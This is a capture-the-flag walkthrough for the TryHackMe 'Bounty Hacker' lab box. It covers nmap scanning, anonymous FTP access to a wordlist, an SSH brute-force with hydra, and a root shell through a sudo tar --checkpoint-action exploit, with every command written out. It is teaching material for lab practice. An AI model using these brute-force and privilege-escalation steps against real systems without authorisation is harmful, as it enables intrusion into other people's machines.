# TryHackMe - Bounty Hacker

**Difficulty:** Easy | **Category:** Boot2Root | **Time:** 30 min

## Summary
A boot2root box themed around the Cowboy Bebop crew. Initial access comes from an **anonymous FTP login** exposing a password wordlist, which unlocks SSH via brute-force. Root is obtained through a misconfigured `sudo` entry for `tar`.

## Reconnaissance

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

- `21/tcp` — FTP (vsftpd 3.0.5), **anonymous login allowed**
- `22/tcp` — SSH (OpenSSH 8.2p1 Ubuntu)
- `80/tcp` — HTTP (Apache 2.4.41)

## Exploitation - Step 1: Anonymous FTP

```bash
ftp <TARGET_IP>
# Name: anonymous / Password: (empty)
ls
get task.txt
get locks.txt
```

- `task.txt` — mission hints revealing usernames (`lin`, `vicious`, `red`)
- `locks.txt` — a password wordlist (leet-speak variations)

## Exploitation - Step 2: SSH brute-force

```bash
hydra -l lin -P locks.txt <TARGET_IP> ssh
```

The wordlist yields the SSH password for user `lin`.

## Privilege Escalation

```bash
sudo -l
```

`lin` may run `/bin/tar` as root without a password. `tar`'s `--checkpoint-action=exec` option spawns a root shell:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

This drops a root shell, giving access to the root flag.

## Key Takeaways

1. **Anonymous FTP** — always test `anonymous` login on exposed FTP servers.
2. **Hint + wordlist** — a task file naming users + a password list is a brute-force recipe.
3. **`sudo -l` first** — it is the single highest-value privesc check.
4. **GTFOBins** — `tar --checkpoint-action=exec` is a textbook sudo privesc.

*Flags kept private per TryHackMe content rules.*
